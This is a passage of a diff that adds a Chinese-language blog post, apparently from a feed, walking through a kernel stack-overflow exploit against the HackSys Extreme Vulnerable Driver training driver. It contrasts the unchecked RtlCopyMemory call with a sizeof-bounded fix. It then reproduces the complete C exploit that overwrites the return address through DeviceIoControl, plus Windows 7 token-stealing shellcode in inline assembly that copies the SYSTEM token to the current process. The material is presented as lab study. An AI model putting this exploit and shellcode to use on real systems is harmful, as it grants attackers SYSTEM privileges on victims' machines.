+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));  
+        //用 sizeof 限制大小
+#else
+        DbgPrint(&quot;[+] Triggering Stack Overflow\n&quot;);
+
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);  //UserBuffer 的大小
+#endif
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        Status = GetExceptionCode();
+        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);
+    }
+
+    return Status;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RtlCopyMemory&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;memcpy&lt;/code&gt;，常見的問題是沒有檢查 User Mode 傳過來的參數或大小，先看有問題的寫法( Source Code 第 28 行 )，這裡的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Size&lt;/code&gt; 是 UserBuffer 的大小&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;正確的寫法可以用 &lt;code class=&quot;highlighter-rouge&quot;&gt;sizeof&lt;/code&gt; 來限制 memcpy 時，copy 的大小不會超出 &lt;code class=&quot;highlighter-rouge&quot;&gt;KernelBuffer&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;若是沒有檢查，可能會造成 Overflow，蓋到 ret&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-0000081C KernelBuffer    db 2048 dup(?)
+-0000001C var_1C          dd ?
+-00000018 ms_exc          CPPEH_RECORD ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008 UserBuffer      dd ?                    ; offset
++0000000C Size            dd ?
++00000010
++00000010 ; end of stack variables
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploit&quot;&gt;Exploit&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;首先，在 User Mode 申請一塊具有可讀可寫可執行 (RWX) 權限的記憶體，用來存放 Shellcode&lt;/li&gt;
+  &lt;li&gt;把 token stealing shellcode 放到這塊記憶體中&lt;/li&gt;
+  &lt;li&gt;取得 HacksysExtremeVulnerableDriver device 的 Handle&lt;/li&gt;
+  &lt;li&gt;將 return address 修改為 Userland 中 shellcode 的記憶體位置， 當函數 return 後，shellcode 就會被執行&lt;/li&gt;
+  &lt;li&gt;Shellcode 會去找 system 這隻 process (PID = 4)，並取得他的 token&lt;/li&gt;
+  &lt;li&gt;還原 StackFrame，否則會藍屏，因為在 Kernel 中做事&lt;/li&gt;
+  &lt;li&gt;擁有 system token 代表具有 system 的權限，用該權限建立的 cmd.exe 會有 system 的權限&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;HackSys Extreme Vulnerable Driver 的 &lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/StackOverflow.c&quot;&gt;Exploit StackOverflow.c&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;#include &quot;StackOverflow.h&quot;
+
+DWORD WINAPI StackOverflowThread(LPVOID Parameter) {
+    HANDLE hFile = NULL;
+    ULONG BytesReturned;
+    PVOID MemoryAddress = NULL;
+    PULONG UserModeBuffer = NULL;
+    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
+    PVOID EopPayload = &amp;amp;TokenStealingPayloadWin7; //shellcode
+    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * sizeof(ULONG);
+
+    __try {
+        DEBUG_MESSAGE(&quot;\t[+] Setting Thread Priority\n&quot;);
+
+        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
+            DEBUG_ERROR(&quot;\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n&quot;);
+        }
+        else {
+            DEBUG_INFO(&quot;\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n&quot;);
+        }
+
+        // Get the device handle
+        DEBUG_MESSAGE(&quot;\t[+] Getting Device Driver Handle\n&quot;);
+        DEBUG_INFO(&quot;\t\t[+] Device Name: %s\n&quot;, FileName);
+
+        hFile = GetDeviceHandle(FileName);
+
+        if (hFile == INVALID_HANDLE_VALUE) {
+            DEBUG_ERROR(&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;, GetLastError());
+            exit(EXIT_FAILURE);
+        }
+        else {
+            DEBUG_INFO(&quot;\t\t[+] Device Handle: 0x%X\n&quot;, hFile);
+        }
+
+        DEBUG_MESSAGE(&quot;\t[+] Setting Up Vulnerability Stage\n&quot;);
+
+        DEBUG_INFO(&quot;\t\t[+] Allocating Memory For Buffer\n&quot;);
+
+        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
+                                           HEAP_ZERO_MEMORY,
+                                           UserModeBufferSize);
+
+        if (!UserModeBuffer) {
+            DEBUG_ERROR(&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;, GetLastError());
+            exit(EXIT_FAILURE);
+        }
+        else {
+            DEBUG_INFO(&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;, UserModeBuffer);
+            DEBUG_INFO(&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;, UserModeBufferSize);
+        }
+
+        DEBUG_INFO(&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;);
+
+        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);
+
+        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - sizeof(ULONG));
+        *(PULONG)MemoryAddress = (ULONG)EopPayload;
+
+        DEBUG_INFO(&quot;\t\t\t[+] RET Value: 0x%p\n&quot;, *(PULONG)MemoryAddress);
+        DEBUG_INFO(&quot;\t\t\t[+] RET Address: 0x%p\n&quot;, MemoryAddress);
+
+        DEBUG_INFO(&quot;\t\t[+] EoP Payload: 0x%p\n&quot;, EopPayload);
+
+        DEBUG_MESSAGE(&quot;\t[+] Triggering Kernel Stack Overflow\n&quot;);
+
+        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);
+
+        DeviceIoControl(hFile,
+                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
+                        (LPVOID)UserModeBuffer,
+                        (DWORD)UserModeBufferSize,
+                        NULL,
+                        0,
+                        &amp;amp;BytesReturned,
+                        NULL);
+
+        OutputDebugString(&quot;****************Kernel Mode****************\n&quot;);
+
+        HeapFree(GetProcessHeap(), 0, (LPVOID)UserModeBuffer);
+
+        UserModeBuffer = NULL;
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        DEBUG_ERROR(&quot;\t\t[-] Exception: 0x%X\n&quot;, GetLastError());
+        exit(EXIT_FAILURE);
+    }
+
+    return EXIT_SUCCESS;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FS:[0x124]&lt;/code&gt; 在 Win 7 上會指向目前 Process 的 &lt;code class=&quot;highlighter-rouge&quot;&gt;KTHREAD&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/aGbWKxm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GS&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;FS&lt;/code&gt; 是根據 OS Kernel 來決定用途，&lt;code class=&quot;highlighter-rouge&quot;&gt;FS&lt;/code&gt; 在 Windows 上會指向一些 structure&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ETHREAD&lt;/code&gt; 結構與 &lt;code class=&quot;highlighter-rouge&quot;&gt;ERPOCESS&lt;/code&gt; 結構圖&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/FVy7m0t.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;因為我們將函數 ret 的位置改成我們的 shellcode，Shellcode 執行完會無法回到原本正確的位置，所以為了讓程式能繼續執行，則需要調整 esp 的位置&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike=&quot;&gt;VOID TokenStealingPayloadWin7() {
+    // Importance of Kernel Recovery
+    __asm {
+        pushad                               ; Save registers state
+                                             ; 存目前暫存器的狀態，後面需要還原用
+
+        ; Start of Token Stealing Stub
+        xor eax, eax                         ; Set ZERO
+        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
+                                             ; _KTHREAD is located at FS:[0x124]
+                                             ; 取得目前 Process 的 KTHREAD 放到 eax
+                                             
+
+        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process
+                                             ; 取得[目前 Process 的 KTHREAD + EPROCESS_OFFSET] 的位置放到 eax
+        mov ecx, eax                         ; Copy current process _EPROCESS structure
+                                             ; 複製目前 Process 的 Eprocess structure 到 ecx
+           
+        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
+
+        SearchSystemPID:
+            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+                                             ; 從目前 eprocess 的 ActiveProcessLinks 找 system 的 eprocess 
+            sub eax, FLINK_OFFSET            ; Flink 會指向下個 eprocess 的 ActiveProcessLinks 所在位置(而不是開頭)，所以需要 sub FLINK_OFFSET 回到下個 eprocess 的開頭
+            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
+                                             ; 比較 nt!_EPROCESS.UniqueProcessId 是不是 4
+            jne SearchSystemPID              ; 如果不是 4 就重新找，所以當跳出這個迴圈出來一定會是 4
+
+        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
+                                             ; edx 指向 token 所在位置  
+
+        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
+                                             ; with SYSTEM process nt!_EPROCESS.Token
+                                             ; 將目前 process token 換成 system token
+        ; End of Token Stealing Stub
+
+        popad                                ; Restore registers state
+
+        ; Kernel Recovery Stub
+        xor eax, eax                         ; Set NTSTATUS SUCCEESS
+        add esp, 12                          ; Fix the stack
+        pop ebp                              ; Restore saved EBP
+        ret 8                                ; Return cleanly
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
+&lt;p&gt;開啟 cmd.exe 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; 看目前的權限&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8dXeTWf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;執行 Exploit code&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/uEdzuZG.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;再次開啟 cmd.exe 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; 看目前的權限&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/oBqLnbi.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.codemachine.com/article_kernelstruct.html&quot;&gt;codemachine - Windows kernel data structures&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.codemachine.com/article_kernelstruct.html&quot;&gt;McDermott - x64 Kernel Privilege Escalation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives&quot;&gt;coresecurity - Abusing GDI for ring0 exploit primitives&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/expDev/14.html&quot;&gt;fuzzysecurity - Kernel Exploitation Stack Overflow&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf&quot;&gt;Tarjei Mandt - Kernel Pool Exploitation on Windows 7&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf&quot;&gt;j00ru - Reserve Objects in Windows 7&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </content>
  </entry>
